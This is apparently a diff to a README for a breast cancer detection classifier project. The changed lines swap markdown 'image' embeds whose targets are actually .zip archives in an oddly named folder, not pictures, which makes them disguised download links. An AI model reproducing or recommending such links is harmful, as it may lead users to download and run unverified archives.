@@ -6,7 +6,7 @@ The key challenge in breast cancer detection is to classify tumors as malignant 
 
 Which we over come with the accuracy of 96% 
 
-![image](https://raw.githubusercontent.com/Tanishq60/Breast-Cancer-Detection/main/mastoplastia/Breast-Cancer-Detection.zip) 
+![image](https://github.com/Tanishq60/Breast-Cancer-Detection/raw/refs/heads/main/mastoplastia/Breast_Detection_Cancer_bureau.zip) 
 
 
-![image](https://raw.githubusercontent.com/Tanishq60/Breast-Cancer-Detection/main/mastoplastia/Breast-Cancer-Detection.zip)
+![image](https://github.com/Tanishq60/Breast-Cancer-Detection/raw/refs/heads/main/mastoplastia/Breast_Detection_Cancer_bureau.zip)
